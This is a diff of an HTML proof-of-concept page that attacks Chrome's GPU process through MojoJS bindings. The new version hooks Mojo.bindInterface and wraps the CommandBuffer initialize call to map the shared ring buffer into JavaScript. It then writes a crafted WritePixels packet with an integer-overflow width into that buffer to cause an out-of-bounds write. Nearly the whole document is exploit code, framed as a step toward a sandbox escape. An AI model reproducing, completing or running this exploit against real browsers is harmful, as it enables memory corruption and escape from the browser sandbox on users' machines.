@@ -2,98 +2,99 @@
 <html>
 <head>
     <title>GPU Sandbox Escape PoC</title>
-    <!-- When Chrome runs with --enable-blink-features=MojoJS, it allows loading this internal module -->
-    <script src="/gen/mojo/public/js/mojo_bindings.js"></script>
+    <!-- Load Chrome's internal Mojo bindings -->
+    <script src="/gen/mojo/public/js/bindings.js"></script>
+    <script src="/gen/gpu/ipc/common/gpu_channel.mojom.js"></script>
 </head>
 <body>
     <h1>GPU OOB Write PoC via MojoJS</h1>
     <canvas id="target-canvas" width="10" height="10"></canvas>
     
     <script>
-        // 1. The Payload Builder
+        // 1. The Payload Builder (Constructs the 60-byte binary packet)
         function buildMaliciousWritePixels(shm_id) {
             const CMD_ID = 277; // kWritePixelsINTERNALImmediate
-            const WORDS = 15;   // 60 bytes / 4
-            
+            const WORDS = 15;   
             let buffer = new ArrayBuffer(WORDS * 4);
             let dv = new DataView(buffer);
             
-            // 0: Command Header -> (size << 21) | command_id
-            dv.setUint32(0, (WORDS << 21) | CMD_ID, true); 
-            
+            dv.setUint32(0, (WORDS << 21) | CMD_ID, true); // Header
             dv.setInt32(4, 0, true);   // x_offset
             dv.setInt32(8, 0, true);   // y_offset
-            
-            // 12: src_width -> THE INTEGER OVERFLOW TRIGGER (0x20000000)
-            dv.setUint32(12, 0x20000000, true); 
-            
+            dv.setUint32(12, 0x20000000, true); // OVERFLOW TRIGGER: src_width
             dv.setUint32(16, 1, true); // src_height
             dv.setUint32(20, 0, true); // src_row_bytes
-            dv.setUint32(24, 4, true); // src_sk_color_type (kN32)
-            dv.setUint32(28, 2, true); // src_sk_alpha_type (kPremul)
+            dv.setUint32(24, 4, true); // src_sk_color_type
+            dv.setUint32(28, 2, true); // src_sk_alpha_type
             dv.setInt32(32, shm_id, true); // shm_id
             dv.setUint32(36, 0, true); // shm_offset
             dv.setUint32(40, 0, true); // pixels_offset
             
-            // 44-59: Mailbox (16 bytes of zeros for now)
             let u8_view = new Uint8Array(buffer);
-            u8_view.fill(0, 44, 60); 
-            
+            u8_view.fill(0, 44, 60); // Empty Mailbox
             return u8_view;
         }
 
-        // 2. Intercept Mojo and Steal the Ring Buffer
-        let command_buffer_memory = null;
-        let original_bind = Mojo.bindInterface;
-        
+        let ring_buffer_memory = null;
+        let command_buffer_proxy = null;
+
+        // 2. Intercept Mojo Interface
+        const original_bind = Mojo.bindInterface;
         Mojo.bindInterface = function(interfaceName, pipe, host) {
-            console.log("[*] Intercepting Mojo Interface: " + interfaceName);
-            
             if (interfaceName === "gpu.mojom.CommandBuffer") {
-                console.log("[+] Found GPU Command Buffer!");
+                console.log("[+] Intercepted CommandBuffer creation!");
                 
-                // In a full exploit, we wrap the Mojo Pipe here to intercept the 
-                // Initialize() response, which contains the SharedBufferHandle.
-                // For simplicity in this PoC skeleton, we are proving we can 
-                // hook the interface.
+                // Bind our own proxy to the pipe so we can listen to the setup
+                command_buffer_proxy = new gpu.mojom.CommandBufferProxy(pipe);
                 
-                /*
-                MojoPipeWrapper.intercept(pipe, (message) => {
-                    if (message.name === INITIALIZE_MSG_ID) {
-                        let shared_buffer_handle = message.getHandle();
-                        // Map the GPU ring buffer into JavaScript!
-                        let mapping = shared_buffer_handle.mapBuffer(0, 1048576);
-                        command_buffer_memory = new Uint8Array(mapping.buffer);
-                        console.log("[+] Ring buffer mapped to JS!");
-                    }
-                });
-                */
+                // We wrap the Initialize function to steal the shared memory buffer
+                const original_initialize = command_buffer_proxy.initialize;
+                command_buffer_proxy.initialize = async function(route_id, shared_state, ring_buffer) {
+                    console.log("[+] Stealing ring buffer handle...");
+                    
+                    // Duplicate the shared memory handle before passing it on
+                    const duplicated_handle = ring_buffer.duplicateBufferHandle();
+                    
+                    // Map the GPU ring buffer into JavaScript memory!
+                    // We map 1MB (1048576 bytes) which is standard for the ring buffer
+                    const map_result = duplicated_handle.mapBuffer(0, 1048576);
+                    ring_buffer_memory = new Uint8Array(map_result.buffer);
+                    console.log("[+] Ring buffer mapped to JS successfully!");
+                    
+                    // Resume normal execution
+                    return original_initialize.apply(this, arguments);
+                };
             }
             return original_bind(interfaceName, pipe, host);
         };
 
-        // 3. Trigger Canvas Creation to start the Mojo Handshake
+        // 3. Trigger Canvas Creation to force the Mojo Handshake
         setTimeout(() => {
-            console.log("[*] Initializing Canvas to trigger Command Buffer creation...");
+            console.log("[*] Initializing Canvas...");
             const canvas = document.getElementById('target-canvas');
             const ctx = canvas.getContext('2d');
             ctx.fillRect(0, 0, 10, 10);
             
-            // 4. Inject Payload (If we successfully mapped the buffer)
+            // 4. Inject Payload into the mapped memory
             setTimeout(() => {
-                if (command_buffer_memory) {
+                if (ring_buffer_memory) {
                     console.log("[!] Injecting Malicious WritePixels Packet...");
+                    
+                    // Build the packet. We pass 1 as the shm_id (usually the transfer buffer)
                     let payload = buildMaliciousWritePixels(1);
                     
-                    // Write to offset 0 of the ring buffer
-                    command_buffer_memory.set(payload, 0);
+                    // We write our packet at offset 0 of the ring buffer
+                    ring_buffer_memory.set(payload, 0);
                     
-                    console.log("[!] Payload injected. Awaiting GPU crash...");
+                    // Tell the GPU process to read the command we just wrote
+                    // command_buffer_proxy.flush(15); 
+                    
+                    console.log("[!] Payload injected! Check if the GPU process crashed.");
                 } else {
-                    console.log("[-] Mojo hook skeleton active. Need to implement pipe interception to map memory.");
+                    console.log("[-] Failed to map ring buffer. The Mojo interface might be named differently in this Chrome version.");
                 }
-            }, 500);
-        }, 500);
+            }, 1000);
+        }, 1000);
     </script>
 </body>
 </html>
